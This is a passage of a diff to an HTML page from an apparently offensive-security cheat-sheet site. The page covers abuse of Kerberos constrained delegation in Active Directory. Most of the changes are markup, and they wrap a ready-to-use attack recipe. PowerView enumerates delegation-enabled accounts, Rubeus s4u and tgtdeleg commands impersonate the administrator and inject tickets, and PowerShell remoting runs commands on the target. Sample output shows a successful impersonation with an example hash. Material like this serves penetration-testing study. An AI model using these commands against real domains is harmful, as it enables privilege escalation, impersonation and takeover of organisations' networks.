 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] SMBv3.0 dialect used
 </span></span></span><span class="line"><span class="cl"><span class="go">[!] Launching semi-interactive shell - Careful what you execute
 </span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
 </span></span></span><span class="line"><span class="cl"><span class="go">C:\&gt;
-</span></span></span></code></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p></div>
-
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-pre-check">1. Pre-Check</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import powerview
+</span></span></span></div></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-pre-check">1. Pre-Check</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import powerview
 </span></span><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check msds-allowedtodelegateto
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check msds-allowedtodelegateto
 </span></span><span class="line"><span class="cl"><span class="go">Get-NetUser -TrustedToAuth
-</span></span></span></code></pre></div><p><button data-tabset="set1-2" data-tabcontent="tab1" class="active">Hash</button>
-<button data-tabset="set1-2" data-tabcontent="tab2" >Kerberos</button></p>
-<div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab1"><h4 id="2-calculate-hash">2. Calculate Hash</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:&#39;&lt;PASSWORD&gt;&#39; /user:&#39;&lt;USER&gt;&#39; /domain:&lt;DOMAIN&gt;
-</span></span></span></code></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /aes256:&lt;HASH&gt; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;MS01$&#39; /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:&#34;cifs/dc01.client.example.com&#34; /nowrap /ptt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><p class="tabs"><button data-tabset="set1-2" data-tabcontent="tab1" class="active">Hash</button>
+<button data-tabset="set1-2" data-tabcontent="tab2">Kerberos</button></p>
+<div class="tabset-wrapper" data-tabset-group="set1-2"><div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab1"><h4 id="2-calculate-hash">2. Calculate Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:'<span class="o">&lt;PASSWORD&gt;</span>' /user:'<span class="o">&lt;USER&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'<span class="o">&lt;USER&gt;</span>' /aes256:<span class="o">&lt;HASH&gt;</span> /impersonateuser:'<span class="o">&lt;IMPERSONATE_USER&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span> /msdsspn:'<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>' /altservice:<span class="o">&lt;ALT_SERVICE&gt;</span> /nowrap /ptt
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'MS01$' /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:"cifs/dc01.client.example.com" /nowrap /ptt
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
 </span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
@@ -414,7 +395,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using rc4_hmac hash: 7ddf32e17a6ac5ce04a8ecbf782ca509
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;CLIENT.EXAMPLE.COM\MS01$&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: 'CLIENT.EXAMPLE.COM\MS01$'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: 172.16.1.2:88
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
@@ -423,51 +404,59 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building S4U2self request for: &#39;MS01$@CLIENT.EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building S4U2self request for: 'MS01$@CLIENT.EXAMPLE.COM'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2self request to 172.16.1.2:88
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2self success!
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for &#39;administrator&#39; to &#39;MS01$@CLIENT.EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGGjCCBh ...[SNIP]... cbBU1TMDIk
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user &#39;administrator&#39; to target SPN &#39;cifs/dc01.client.example.com&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: &#39;cifs/dc01.client.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2proxy request to domain controller 172.16.1.2:88
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN &#39;cifs/dc01.client.example.com&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIG9DCCBv ...[SNIP]... 9yZS5jb20=
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
-</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /aes256:&lt;HASH&gt; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
-</span></span></span></code></pre></div></div>
-<div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab2"><h4 id="2-request-a-tgt">2. Request a TGT</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe tgtdeleg /nowrap /ptt
-</span></span></span></code></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /ticket:&#39;&lt;BASE64_TICKET&gt;&#39; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
-</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /ticket:&#39;&lt;BASE64_TICKET&gt;&#39; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
-</span></span></span></code></pre></div></div>
-<h4 id="4-remote">4. Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">klist
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create session
-</span></span><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">session</span> <span class="o">=</span> new-pssession -computername &lt;COMPUTER_NAME&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute cmd
-</span></span><span class="line"><span class="cl"><span class="go">invoke-command $session { &lt;CMD&gt; }
-</span></span></span></code></pre></div></div></p>
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'<span class="o">&lt;USER&gt;</span>' /aes256:<span class="o">&lt;HASH&gt;</span> /impersonateuser:'<span class="o">&lt;IMPERSONATE_USER&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span> /msdsspn:'<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>' /altservice:<span class="o">&lt;ALT_SERVICE&gt;</span> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab2"><h4 id="2-request-a-tgt">2. Request a TGT</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe tgtdeleg /nowrap /ptt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'<span class="o">&lt;USER&gt;</span>' /ticket:'<span class="o">&lt;BASE64_TICKET&gt;</span>' /impersonateuser:'<span class="o">&lt;IMPERSONATE_USER&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span> /msdsspn:'<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>' /altservice:<span class="o">&lt;ALT_SERVICE&gt;</span> /nowrap /ptt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:'<span class="o">&lt;USER&gt;</span>' /ticket:'<span class="o">&lt;BASE64_TICKET&gt;</span>' /impersonateuser:'<span class="o">&lt;IMPERSONATE_USER&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span> /msdsspn:'<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>' /altservice:<span class="o">&lt;ALT_SERVICE&gt;</span> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
 
-</div></div>
-    
-    <script type="module" src="/js/main.js"></script>
-    <footer>
-    <hr>
-    <div class="footer-text">
-        <div>© 2025 TLDRBins</div>
-    </div>
+<h4 id="4-remote">4. Remote</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create session
+</span></span><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">session</span> <span class="o">=</span> new-pssession -computername <span class="o">&lt;COMPUTER_NAME&gt;</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute cmd
+</span></span><span class="line"><span class="cl"><span class="go">invoke-command $session { <span class="o">&lt;CMD&gt;</span> }
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+<p></p>
+
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
 </footer>
-</body>
-</html>
+
+
+</body></html>
